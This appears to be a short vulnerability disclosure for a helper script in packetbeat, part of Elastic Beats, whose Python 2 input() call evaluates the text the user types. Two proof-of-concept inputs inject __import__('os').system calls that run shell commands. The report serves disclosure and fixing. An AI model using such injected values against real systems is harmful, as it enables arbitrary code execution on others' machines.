# Description
The ```Beats``` are lightweight data shippers, written in Go, that you install on your servers to capture all sorts of operational data (think of logs, metrics, or network packet data). It has a ```packetbeat``` module to Monitor the network and applications by sniffing packets. 
This packekbeat contain a ```create_tcp_protocol.py``` which run in ```python 2``` and takes in a input using unsafe ```input()``` function which leads to a ```Code Injection``` vulnerability. This code injection bug could also lead to ```Arbitrary code execution```.

#Proof-of-Concept
```
$ python create_tcp_protocol.py
Protocol Name [exampletcp]: __import__("os").system("uname -a")
```
RCE PoC
```
$ python create_tcp_protocol.py
Protocol Name [exampletcp]: __import__("os").system("touch HACKED.txt")
```